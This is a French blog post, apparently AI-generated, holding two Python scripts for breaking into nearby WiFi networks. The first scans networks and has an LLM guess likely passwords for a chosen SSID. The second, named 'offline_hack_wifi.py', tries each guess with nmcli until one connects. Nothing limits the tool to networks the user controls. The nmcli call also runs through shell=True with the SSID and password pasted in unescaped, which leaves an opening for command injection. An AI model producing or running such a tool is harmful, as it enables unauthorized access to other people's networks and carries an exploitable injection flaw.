---
audio: false
generated: true
image: false
lang: fr
layout: post
model: x-ai/grok-4-fast
title: Générateur de Mot de Passe WiFi
translated: true
type: note
---

```python
#!/usr/bin/env python3
"""
Script de Génération de Mots de Passe WiFi
Scanne les réseaux WiFi, permet à l'utilisateur d'en sélectionner un, génère des mots de passe suggérés en utilisant LLM, et les enregistre dans le répertoire @tmp.
Ce script nécessite un accès en ligne pour LLM. Utilisez un script hors ligne séparé pour tenter des connexions avec les mots de passe enregistrés.
"""

import os
import sys
from get_wifi_list import get_wifi_list
from openrouter_client import call_openrouter_api

# S'assurer que le répertoire @tmp existe
TMP_DIR = '@tmp'
os.makedirs(TMP_DIR, exist_ok=True)

def parse_wifi_list(wifi_output):
    """
    Analyse la sortie de get_wifi_list pour extraire les SSID et les détails.
    Retourne une liste de dictionnaires avec 'index', 'ssid', 'full_line'.
    """
    networks = []
    lines = wifi_output.split('\n')
    current_ssid = None
    for i, line in enumerate(lines):
        if line.startswith('SSID: '):
            # Extraire le SSID de la ligne
            ssid_part = line.split('SSID: ')[1].split(',')[0].strip()
            current_ssid = ssid_part
            networks.append({
                'index': len(networks) + 1,
                'ssid': current_ssid,
                'full_line': line
            })
        elif current_ssid and line.strip().startswith('  '):
            # Ajouter des informations supplémentaires au dernier réseau s'il s'agit d'une sous-ligne
            networks[-1]['full_line'] += '\n' + line
    return networks

def generate_password_suggestions(ssid, num_suggestions=10, model="deepseek-v3.2"):
    """
    Utilise OpenRouter LLM pour générer des mots de passe suggérés pour le SSID donné.
    """
    prompt = f"Suggérez {num_suggestions} mots de passe possibles pour un réseau WiFi nommé '{ssid}'. Rendez-les plausibles en fonction des modèles courants, du nom ou des valeurs par défaut. Listez-les numérotés, un par ligne, sans explications."
    try:
        response = call_openrouter_api(prompt, model=model)
        # Nettoyer la réponse pour extraire uniquement la liste
        lines = [line.strip() for line in response.split('\n') if line.strip() and line[0].isdigit()]
        passwords = [line.split('.', 1)[1].strip() if '.' in line else line for line in lines[:num_suggestions]]
        return passwords
    except Exception as e:
        print(f"Erreur lors de la génération des mots de passe: {e}")
        return []

def save_passwords_to_file(ssid, passwords):
    """
    Enregistre la liste des mots de passe dans un fichier du répertoire @tmp.
    """
    filename = os.path.join(TMP_DIR, f"{ssid.replace(' ', '_')}_passwords.txt")
    with open(filename, 'w') as f:
        for pwd in passwords:
            f.write(f"{pwd}\n")
    print(f"Mots de passe enregistrés dans: {filename}")
    return filename

def main():
    print("=== Générateur de Mots de Passe WiFi ===")
    print()

    # Obtenir la liste WiFi
    print("Scan des réseaux WiFi disponibles...")
    wifi_output = get_wifi_list()
    print("Réseaux WiFi Disponibles:")
    if wifi_output.startswith("No WiFi"):
        print(f"  {wifi_output}")
        sys.exit(1)

    # Analyser et afficher la liste numérotée
    networks = parse_wifi_list(wifi_output)
    if not networks:
        print("Aucun réseau trouvé.")
        sys.exit(1)

    for net in networks:
        print(f"{net['index']}. {net['full_line']}")

    # Saisie utilisateur
    try:
        choice = int(input(f"\nSélectionnez un réseau (1-{len(networks)}): "))
        if 1 <= choice <= len(networks):
            selected = networks[choice - 1]
            ssid = selected['ssid']
            print(f"\nSélectionné: {ssid}")
        else:
            print("Choix invalide.")
            sys.exit(1)
    except ValueError:
        print("Saisie invalide.")
        sys.exit(1)

    # Générer les mots de passe
    print(f"\nGénération de {10} suggestions de mots de passe pour '{ssid}'...")
    passwords = generate_password_suggestions(ssid)

    if passwords:
        print("Mots de passe suggérés:")
        for i, pwd in enumerate(passwords, 1):
            print(f"{i}. {pwd}")
        # Enregistrer dans un fichier
        save_passwords_to_file(ssid, passwords)
    else:
        print("Échec de la génération des mots de passe.")

    print("\nUtilisez un script hors ligne séparé pour lire ce fichier et tenter des connexions.")

if __name__ == "__main__":
    main()
```

Pour le script de hacking hors ligne (par exemple, `offline_hack_wifi.py`), vous pouvez le créer séparément pour lire les mots de passe depuis `@tmp/{ssid}_passwords.txt` et tenter de se connecter en utilisant des outils comme `nmcli` ou `wpa_supplicant`. Voici un squelette de base:

```python
#!/usr/bin/env python3
"""
Script de Hacking WiFi Hors Ligne
Lit les mots de passe enregistrés et tente de se connecter au WiFi sélectionné hors ligne.
"""

import os
import subprocess
import sys

TMP_DIR = '@tmp'

def attempt_connect(ssid, password):
    """
    Tente de se connecter au WiFi en utilisant nmcli (ou une méthode de secours).
    """
    cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Succès avec le mot de passe: {password}")
            return True
        else:
            print(f"Échec avec le mot de passe: {password}")
            return False
    except Exception as e:
        print(f"Erreur lors de la tentative de connexion: {e}")
        return False

def main():
    ssid_file = input("Entrez le SSID ou le nom complet du fichier dans @tmp (ex: MonWiFi_passwords.txt): ").strip()
    filepath = os.path.join(TMP_DIR, ssid_file)
    
    if not os.path.exists(filepath):
        print("Fichier non trouvé.")
        sys.exit(1)
    
    ssid = ssid_file.replace('_passwords.txt', '').replace('_', ' ')
    print(f"Tentative de connexion à '{ssid}'...")
    
    with open(filepath, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    for pwd in passwords:
        if attempt_connect(ssid, pwd):
            break
    else:
        print("Tous les mots de passe ont échoué.")

if __name__ == "__main__":
    main()
```